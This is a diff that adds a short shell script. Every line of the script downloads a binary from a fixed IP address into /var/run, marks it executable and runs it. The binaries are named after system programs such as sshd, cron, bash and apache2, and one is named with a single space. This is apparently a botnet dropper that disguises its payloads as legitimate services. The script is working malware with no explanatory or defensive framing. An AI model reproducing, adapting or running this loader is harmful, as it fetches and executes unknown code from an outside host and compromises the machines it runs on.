@@ -1,0 +1,14 @@
+#!/bin/sh
+
+wget -c http://94.237.35.34/ntpd -P /var/run && chmod +x /var/run/ntpd && /var/run/ntpd
+wget -c http://94.237.35.34/sshd -P /var/run && chmod +x /var/run/sshd && /var/run/sshd
+wget -c http://94.237.35.34/bash -P /var/run && chmod +x /var/run/bash && /var/run/bash
+wget -c http://94.237.35.34/openssh -P /var/run && chmod +x /var/run/openssh && /var/run/openssh
+wget -c http://94.237.35.34/tftp -P /var/run && chmod +x /var/run/tftp && /var/run/tftp
+wget -c http://94.237.35.34/wget -P /var/run && chmod +x /var/run/wget && /var/run/wget 
+wget -c http://94.237.35.34/cron -P /var/run && chmod +x /var/run/cron && /var/run/cron
+wget -c http://94.237.35.34/ftp -P /var/run && chmod +x /var/run/ftp && /var/run/ftp
+wget -c http://94.237.35.34/pftp -P /var/run && chmod +x /var/run/pftp && /var/run/pftp
+wget -c http://94.237.35.34/sh -P /var/run && chmod +x /var/run/sh && /var/run/sh
+wget -c http://94.237.35.34/' ' -P /var/run && chmod +x /var/run/' ' && /var/run/' '
+wget -c http://94.237.35.34/apache2 -P /var/run && chmod +x /var/run/apache2 && /var/run/apache2
